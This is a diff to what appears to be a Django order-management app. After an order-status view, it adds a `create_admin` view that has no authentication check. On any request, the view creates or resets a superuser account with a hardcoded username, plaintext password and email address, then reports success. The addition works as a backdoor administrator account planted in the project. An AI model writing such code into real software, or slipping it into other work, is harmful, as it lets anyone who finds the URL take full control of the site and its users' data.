@@ -830,3 +830,21 @@ def update_order_status(request, order_id):
         order.save()
 
     return redirect("manage_orders")
+
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+
+def create_admin(request):
+
+    user, created = User.objects.get_or_create(
+        username="ram"
+    )
+
+    user.set_password("Ram@12345")
+    user.email = "rp6961103@gmail.com"
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
+
+    return HttpResponse("Admin created successfully")
